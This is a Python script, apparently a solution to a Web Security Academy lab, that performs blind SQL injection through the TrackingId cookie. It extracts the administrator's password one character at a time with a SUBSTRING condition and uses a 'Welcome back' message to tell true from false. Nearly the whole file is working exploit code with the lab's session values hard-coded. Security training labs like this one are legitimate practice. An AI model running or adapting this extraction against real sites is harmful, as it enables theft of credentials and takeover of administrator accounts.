import requests

url = 'https://0a7300f304e45a338033a3b500bf0052.web-security-academy.net/filter?category=Gifts'
trackingId = 'A3lqhSuKIR2ODc27'
session = '3INirWqG8BuIQcO8CSClw7Xt9bq0Fn76'

alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
            "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

password = ""
password_length = 20

while len(password) < password_length:
    position = len(password) + 1
    for alp in alphabet: 
        payload = f"{trackingId}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{alp}"
        request = requests.get(url, cookies = {"TrackingId": payload, "session": session} )
        if "Welcome back" in request.text:
            password = password + alp
            print(alp)
            break

print(password)
